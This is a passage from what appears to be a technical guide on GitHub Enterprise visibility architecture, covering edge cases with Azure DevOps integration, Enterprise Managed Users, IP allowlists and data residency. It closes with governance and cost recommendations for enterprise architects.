**Edge case**: Azure Boards AB# mention conflicts when multiple Azure DevOps organizations connect to the same GitHub repository. GitHub cannot disambiguate `AB#123` between organizations, potentially linking work items in wrong organization. Resolution requires exclusive connection (one Azure DevOps org per GitHub repo) or using different mention syntax conventions (though not officially supported).

**Edge case**: Fork builds in Azure Pipelines with GitHub service connection expose secrets by default in older configurations. Starting Sprint 229, explicit configuration required: "Limit building pull requests from forked GitHub repositories" prevents fork builds, or "Make secrets available to builds of forks" requires explicit enablement with security review. Organizations with legacy pipeline configurations should audit fork build settings to prevent secret exposure.

### Enterprise Managed Users and visibility constraints

**Edge case**: EMU enterprise user attempts to fork external public repository for learning/reference. Operation fails—EMU users have read-only access outside enterprise boundaries. Cannot fork external repos, star them, create issues, or submit PRs. Organizations must provide separate personal GitHub accounts for employees to maintain open source presence, creating identity management overhead.

**Edge case**: EMU enterprise acquires another company with standard GitHub Enterprise Cloud organization. Cannot directly migrate repositories while preserving user identity and commit history links because fundamental account architecture differs (managed users vs. personal accounts). Migration requires GitHub Enterprise Importer with complex identity mapping or establishing new EMU organization and accepting history discontinuity.

**Edge case**: EMU enterprise needs to share code with external vendor for short-term project collaboration. Adding vendor as outside collaborator fails—internal repositories explicitly exclude outside collaborators. Workarounds: (1) Create private repository with explicit vendor access (loses innersource discovery), (2) Use restricted users role (Private Beta) with limited internal repo visibility, (3) Establish vendor-specific organization within enterprise and add vendor as member (exposes all internal repos to vendor).

### IP allowlist and networking edge cases

**Edge case**: Organization enables IP allowlist to comply with security requirements, then discovers GitHub Codespaces completely unavailable. IP allowlists and Codespaces are mutually exclusive with no workaround. Organizations must choose between network-level security control and cloud development environments. Alternative: Use self-hosted VS Code Server with Tailscale/VPN within IP allowlist constraints.

**Edge case**: GitHub Actions workflow fails in IP allowlisted organization with "Resource not accessible by integration." Self-hosted runners require runner IP addresses explicitly added to organization IP allowlist. For pools of runners with dynamic IPs (Kubernetes, autoscaling), must allowlist entire CIDR range. GitHub-hosted runners incompatible with IP allowlists—must use self-hosted runners exclusively, eliminating Actions minutes quota benefits.

**Edge case**: GitHub App installed in IP allowlisted organization fails to function. GitHub Apps can configure their own IP allowlists specifying where apps run. Organization must either: (1) Add app's IP addresses to organization allowlist, or (2) Enable "Inherit IP allow list configuration for installed GitHub Apps" in organization settings. Without this, app webhook requests and API calls are blocked, breaking integration functionality.

### Data residency and sovereign cloud considerations

**Edge case**: Existing GitHub Enterprise Cloud customer wants to adopt data residency for GDPR compliance. Migration requires moving to new subdomain (e.g., `acmecorp.ghe.com`) and mandates switching to Enterprise Managed Users. This is not a "simple switch"—requires using GitHub Enterprise Importer to migrate repositories, establishing EMU with IdP integration, and accepting that existing personal account users cannot directly transfer. Complex migration for organizations with thousands of repositories and established workflows.

**Edge case**: Data residency enterprise with EU data storage receives support ticket. Support tickets potentially stored outside region when containing code samples or technical details. Organizations with absolute data sovereignty requirements must: (1) Sanitize support tickets to remove code/data, (2) Establish on-premises GitHub Enterprise Server instead, or (3) Accept limited data residency exemptions for operational support.

**Edge case**: Data residency enterprise needs GitHub App from marketplace. Many marketplace apps hosted in US, creating potential data transfer outside chosen region. EMU enterprises can only use apps created within the enterprise (not marketplace apps). Organizations requiring third-party integrations must: (1) Develop custom GitHub Apps internally, (2) Request vendors deploy apps within data residency region, or (3) Accept data transfer for specific integration use cases with documented exceptions.

## Strategic recommendations for enterprise architects

Selecting repository visibility architecture requires balancing security, cost, collaboration, and compliance. **Default to internal visibility** for new repositories in Enterprise Cloud environments to enable innersource while maintaining security boundaries. Reserve private visibility for repositories requiring explicit access control (vendor collaboration, sensitive algorithms, compliance-restricted data). Only use public visibility when actively seeking community engagement and open source contributions.

**Implement layered visibility policies** at enterprise level: restrict public repository creation (prevent accidental exposure), set internal as default for new repositories (promote innersource), and require organization owner approval for visibility changes (prevent accidental public conversion). For EMU enterprises, automatic public restriction provides additional safety.

**Actions cost management** requires understanding multiplier implications. For organizations with significant macOS builds in private repositories, self-hosted runners eliminate minute charges while introducing infrastructure management overhead. Calculate break-even point: if consuming \>50,000 macOS minutes monthly ($4,000), self-hosted infrastructure becomes cost-effective.

**Package registry strategy** should prioritize Container registry for public packages (anonymous access) and internal repositories for private shared libraries in Enterprise Cloud. Avoid Maven/Gradle registries for cross-repository dependencies due to repository-scoped permission limitations—use npm/NuGet instead even for JVM languages when possible, or accept PAT-based authentication overhead.

**Azure DevOps integration** should standardize on GitHub App authentication for production pipelines, with separate service connections per environment (dev/test/prod) and strict branch controls. Implement audit logging streaming to detect unusual service connection access patterns. For SAML SSO organizations, establish service account management process including PAT authorization for SSO and 90-day rotation cadence.

**EMU adoption** suits highly regulated industries (healthcare, finance, defense, government) requiring maximum control and compliance capabilities. Organizations prioritizing open source contribution, marketplace integration flexibility, or already having established personal account-based workflows should carefully evaluate EMU trade-offs. EMU is fundamentally incompatible with open source development culture—users cannot contribute outside enterprise boundaries from managed accounts.

**Data residency** becomes compelling for organizations with regulatory requirements (GDPR, sovereign data laws, FedRAMP pursuit) but requires EMU adoption and complex migration for existing GHEC customers. The dedicated subdomain architecture provides clear compliance boundaries but limits marketplace integration and requires vendor cooperation for third-party apps.

Successfully navigating GitHub Enterprise visibility architecture requires understanding these interconnected implications, planning for edge cases, and implementing governance policies that balance security with developer productivity in complex multi-repository environments.